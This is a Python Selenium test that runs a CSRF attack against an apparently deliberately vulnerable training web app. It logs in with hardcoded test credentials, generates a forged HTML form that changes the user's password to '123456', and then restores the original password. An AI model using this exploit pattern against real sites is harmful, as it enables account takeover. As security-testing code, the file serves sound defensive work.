from fixtures import webdriver,url,authenticate
import pytest
from selenium.webdriver import Firefox
import time
from jinja2 import Environment, FileSystemLoader
from termcolor import *
from selenium.webdriver.common.keys import Keys
from results import log_results,log_exceptions,delete_index,display_results


def csrf(webdriver):
    try:
        login_url = url + '/login/'
        webdriver.get(login_url)
        email_id = "jessica.alba@we45.com"
        password = 'secdevops'
        authenticate(webdriver,username=email_id,password=password)
        time.sleep(3)
        assert webdriver.current_url == url + '/dashboard/'
        webdriver.find_element_by_link_text(email_id).click()
        time.sleep(2)
        webdriver.find_element_by_link_text("Change Password - Insecure").click()    
        
        pwd_change_url = url + "/password_change/"
        time.sleep(2)
        assert webdriver.current_url == pwd_change_url    
        change_pwd = "123456"
        j2_env = Environment(loader=FileSystemLoader(os.getcwd()), trim_blocks=True)
        file_data = j2_env.get_template('cs_template.html').render(host=pwd_change_url, pwd=change_pwd)
        print colored("Creating CSRF Exploit HTMl", 'green')
        f = open("cs.html", 'w')
        f.write(file_data)
        f.close()

        time.sleep(2)
        mainwindow = webdriver.find_element_by_tag_name("body")
        mainwindow.send_keys(Keys.CONTROL + 't')
        time.sleep(3)
        # window_before = webdriver.window_handles[0]
        # window_after = webdriver.window_handles[1]
        # webdriver.switch_to_window(window_after)
        filepath = os.path.join(os.getcwd(),'cs.html')    
        webdriver.get("file://%s"%filepath)
        time.sleep(2)
        webdriver.find_element_by_xpath("html/body/form/input[3]").click()

        newtab = webdriver.find_element_by_tag_name("body")
        newtab.send_keys(Keys.CONTROL + 'w')
        time.sleep(2)
        # webdriver.switch_to_window(window_before)
        webdriver.find_element_by_link_text(email_id).click()
        webdriver.find_element_by_link_text("Log Out").click()
        time.sleep(2)
        assert webdriver.current_url == login_url

        authenticate(webdriver,email_id, "secdevops")

        if webdriver.current_url == login_url:            
            log_results('test_csrf','%s/dashboard/'%url,'csrf','CSRF Attack','Success')
            print 'Test success'
        else:
            log_results('test_csrf','%s/dashboard/'%url,'csrf','CSRF Attack','Failure')
            print 'Test failure'
        reset_pwd(webdriver,email_id,password,change_pwd)
    except BaseException as e:
        print e
        log_exceptions(e)

    

def reset_pwd(webdriver,email_id,password,change_pwd):
    authenticate(webdriver,email_id, change_pwd)
    try:
        admin_page = webdriver.find_element_by_link_text(email_id)
        if admin_page:
            print colored("CSRF Exploited :)", 'red')
            time.sleep(2)
            webdriver.get(url + '/password_change_secure/')
            webdriver.find_element_by_xpath('//*[@id="id_new_password1"]').send_keys(password)
            webdriver.find_element_by_xpath('//*[@id="id_new_password2"]').send_keys(password)
            webdriver.find_element_by_xpath('/html/body/div[2]/div/div[3]/div/div[2]/form/div[3]/button').click()
            webdriver.find_element_by_link_text(email_id).click()
            webdriver.find_element_by_link_text("Log Out").click()
            # webdriver.close()
    except Exception as e:
        pass

def test_csrf(webdriver):
    delete_index()
    csrf(webdriver)
    display_results()

        

